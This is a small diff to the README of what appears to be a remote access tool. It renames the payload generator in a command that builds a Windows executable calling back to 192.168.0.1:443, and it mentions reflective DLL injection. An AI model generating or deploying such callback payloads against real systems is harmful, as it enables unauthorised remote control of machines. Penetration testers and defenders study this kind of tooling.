@@ -38,7 +38,7 @@ The clients have been tested on (Windows 7, Windows XP, kali linux, ubuntu, Mac 
 ### generate/run a payload
 #### for Windows
 ```bash
-./genpayload.py 192.168.0.1 -p 443 -t exe_x86 -o pupyx86.exe
+./pupygen.py 192.168.0.1 -p 443 -t exe_x86 -o pupyx86.exe
 ```
 you can also use -t dll_x86 or dll_x64 to generate a reflective DLL and inject/load it by your own means.
 #### for Linux
